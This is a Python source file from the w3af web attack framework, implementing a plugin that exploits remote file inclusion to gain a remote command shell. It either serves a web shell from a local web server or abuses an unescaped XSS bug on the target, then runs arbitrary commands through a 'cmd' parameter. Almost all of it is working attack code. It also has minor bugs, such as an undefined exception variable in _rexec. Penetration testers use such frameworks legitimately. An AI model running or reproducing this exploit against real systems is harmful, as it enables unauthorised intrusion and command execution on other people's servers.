'''
remoteFileIncludeShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


# Common includes
from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException
from core.controllers.daemons.webserver import webserver
import os,time

# Advanced shell stuff
from core.data.kb.shell import shell as shell
from plugins.attack.webshells.getShell import getShell

# Port definition
import core.data.constants.w3afPorts as w3afPorts

class remoteFileIncludeShell(baseAttackPlugin):
    '''
    Exploit remote file include vulnerabilities.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        self._shell = None
        self._webServer = None
        
        # User configured variables
        self._listenPort = w3afPorts.REMOTEFILEINCLUDE
        self._listenAddress = ''
        self._useXssBug = False
        self._generateOnlyOne = True

    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with remote file include vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell
        
    def canExploit( self, vulnToExploit=None):
        '''
        Searches the kb for vulnerabilities that this plugin can exploit, this is overloaded from baseAttackPlugin because
        I need to test for xss vulns also. This is a "complex" plugin.

        @parameter vulnToExploit: The id of the vulnerability to exploit.
        @return: True if plugin knows how to exploit a found vuln.
        '''
        if self._listenAddress == '' and not self._useXssBug:
            raise w3afException('remoteFileIncludeShell plugin has to be correctly configured to use.')
        
        rfiVulns = kb.kb.getData( 'remoteFileInclude' , 'remoteFileInclude' )
        if vulnToExploit != None:
            rfiVulns = [ v for v in rfiVulns if v.getId() == vulnToExploit ]
        
        if len( rfiVulns ) == 0:
            return False
        else:
            if self._useXssBug:
                if len( kb.kb.getData( 'xss' , 'xss' ) ):
                    for vuln in kb.kb.getData( 'xss' , 'xss' ):
                        if not vuln['escapesSingle'] and not vuln['escapesDouble'] and not vuln['escapesLtGt']:
                            self._xssVuln = vuln
                            return True
                        else:
                            om.out.error('remoteFileIncludeShell plugin is configured to use a XSS bug to exploit the RFI bug, but no XSS with the required parameters was found.')
                            return False
                else:
                    om.out.error('remoteFileIncludeShell plugin is configured to use a XSS bug to exploit the RFI bug, but no XSS was found.')
                    return False
            else:
                # Using the good old webserver
                return True
    
    def getAttackType(self):
        return 'shell'
    
    def getVulnName2Exploit( self ):
        return 'remoteFileInclude'
        
    def _generateShell( self, vuln ):
        '''
        @return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            # Create the shell object
            s = rfiShell( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setCut( self._header, self._footer )
            s.setWebServer( self._webServer )
            s.setExploitDc( self._exploitDc )
            return s
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        filename = createRandAlpha( 7 )
        extension = urlParser.getExtension( vuln.getURL() )
        
        # I get a list of tuples with fileContent and extension to use
        shellList = getShell( extension )
        
        for fileContent, realExtension in shellList:
            if extension == '':
                extension = realExtension

            urlToInclude = self._genURLToInclude( fileContent, extension )
            
            self._startWebServer()
            
            # Prepare for exploitation...
            functionReference = getattr( self._urlOpener , vuln.getMethod() )
            dc = vuln.getDc()
            dc[ vuln.getVar() ] = urlToInclude

            try:
                httpRes = functionReference( vuln.getURL(), str(dc) )
            except:
                successfullyExploited = False
            else:
                successfullyExploited = self._defineCut( httpRes.getBody(), 'w3af' , exact=True )
            
            if successfullyExploited:
                self._exploitDc = dc
                return successfullyExploited
            else:
                # Remove the file from the local webserver webroot
                self._clearWebServer( urlToInclude )
                
        return False
    
    def _genURLToInclude( self, fileContent, extension ):
        '''
        Generate the URL to include, based on the configuration it will return a 
        URL poiting to a XSS bug, or a URL poiting to our local webserver.
        '''
        if self._useXssBug:
            url = urlParser.uri2url( self._xssVuln.getURL() )
            dc = self._xssVuln.getDc()
            dc = dc.copy()
            dc[ self._xssVuln.getVar() ] = fileContent
            urlToInclude = url + '?' + str(dc)
            return urlToInclude
        else:
            # Write the php to the webroot
            filename = createRandAlNum()
            try:
                f = open( os.path.join('webroot' + os.path.sep, filename ) , 'w')
                f.write( fileContent )
                f.close()
            except:
                raise w3afException('Could not create file in webroot.')
            else:
                urlToInclude = 'http://' + self._listenAddress +':' + str(self._listenPort) +'/' + filename
                return urlToInclude
    
    def _clearWebServer( self, urlToInclude ):
        '''
        Remove the file in the webroot and stop the webserver.
        '''
        if not self._useXssBug and self._webServer:
            self._webServer.stop()
            # Remove the file
            filename = urlToInclude.split('/')[-1:][0]
            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
            self._webServer = None 
    
    def _startWebServer( self ):
        if self._useXssBug:
            return
        if not self._webServer:
            self._webServer = webserver( self._listenAddress, self._listenPort , 'webroot' + os.path.sep)
            self._webServer.start2()
            time.sleep(0.2) # wait for webserver thread to start
            
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="listenAddress">\
                <default>'+str(self._listenAddress)+'</default>\
                <desc>IP address that the webserver will use to receive requests</desc>\
                <type>string</type>\
                <help>w3af runs a webserver to serve the files to the target web app \
                when doing remote file inclusions. This \
                setting configures on what IP address the webserver is going to listen.</help>\
            </Option>\
            <Option name="listenPort">\
                <default>'+str(self._listenPort)+'</default>\
                <desc>Port that the webserver will use to receive requests</desc>\
                <help>w3af runs a webserver to serve the files to the target web app \
                when doing remote file inclusions. This \
                setting configures on what IP address the webserver is going to listen.</help>\
                <type>integer</type>\
                <help></help>\
            </Option>\
            <Option name="useXssBug">\
                <default>'+str(self._useXssBug)+'</default>\
                <desc>Instead of including a file in a local webserver; include the result of exploiting a XSS bug.</desc>\
                <type>boolean</type>\
                <help></help>\
            </Option>\
            <Option name="generateOnlyOne">\
                <default>'+str(self._generateOnlyOne)+'</default>\
                <desc>If true, this plugin will try to generate only one shell object.</desc>\
                <type>boolean</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._listenAddress = optionsMap['listenAddress']
        self._listenPort = optionsMap['listenPort']
        self._useXssBug = optionsMap['useXssBug']
        self._generateOnlyOne = optionsMap['generateOnlyOne']
        
        if self._listenAddress == '' and not self._useXssBug:
            raise w3afException('remoteFileIncludeShell plugin has to be correctly configured to use.')
            
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The exploitation can be
        done using a more classic approach, in which the file to be included is hosted on a webserver that the plugin
        runs, or a nicer approach, in which a XSS bug on the remote site is used to generate the remote file to be included.
        Both ways work and return a shell, but the one that uses XSS will work even when a restrictive firewall is configured
        at the remote site.
        
        Three configurable parameters exist:
            - listenAddress
            - listenPort
            - useXssBug
            - generateOnlyOne
        '''
        
class rfiShell(shell):
    def setExploitDc( self, eDc ):
        self._exploitDc = eDc
    
    def getExploitDc( self ):
        return self._exploitDc
    
    def setWebServer( self, webserverInstance ):
        self._webServer = webserverInstance
    
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell.

        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        eDc = self.getExploitDc()
        eDc = eDc.copy()
        eDc[ 'cmd' ] = urllib.quote_plus( command )
        
        functionReference = getattr( self._urlOpener , self.getMethod() )
        try:
            httpRes = functionReference( self.getURL(), str(eDc) )
        except:
            return 'Unexpected response from the remote web application:' + str(e)
        else:
            return self._cut( httpRes.getBody() )
        
    def end( self ):
        om.out.debug('Remote file inclusion shell is cleaning up.')
        try:
            self._clearWebServer( self.getExploitDc()[ self.getVar() ] )
        except Exception, e:
            om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('Remote file inclusion shell cleanup complete.')
    
    def getName( self ):
        return 'rfiShell'

    def _clearWebServer( self, urlToInclude ):
        '''
        TODO: This is duplicated code!! see above.
        '''
        if self._webServer:
            self._webServer.stop()
            # Remove the file
            filename = urlToInclude.split('/')[-1:][0]
            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
            self._webServer = None
            
